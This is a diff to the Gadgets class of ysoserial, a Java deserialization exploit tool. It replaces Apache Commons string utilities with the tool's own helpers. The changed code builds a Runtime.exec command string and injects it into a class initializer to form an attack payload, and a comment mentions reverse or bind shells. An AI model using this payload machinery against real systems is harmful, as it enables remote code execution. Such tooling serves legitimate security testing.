@@ -17,6 +17,8 @@ import java.util.Map;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import ysoserial.Strings;
+import ysoserial.translate.JavaEscaper;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -25,9 +27,6 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-
-import org.apache.commons.lang3.StringUtils;
-import org.apache.commons.text.StringEscapeUtils;
 
 
 /*
@@ -120,9 +119,9 @@ public class Gadgets {
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         final List<String> escapedParams = new LinkedList<String>();
         for (String param : command) {
-               escapedParams.add("\"" + StringEscapeUtils.escapeJava(param) + "\"");
+               escapedParams.add("\"" + JavaEscaper.escapeJava(param) + "\"");
         }
-        String cmd = "java.lang.Runtime.getRuntime().exec(new String[] {" + StringUtils.join(escapedParams, ", ") + "});";
+        String cmd = "java.lang.Runtime.getRuntime().exec(new String[] {" + Strings.join(escapedParams, ", ") + "});";
 
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
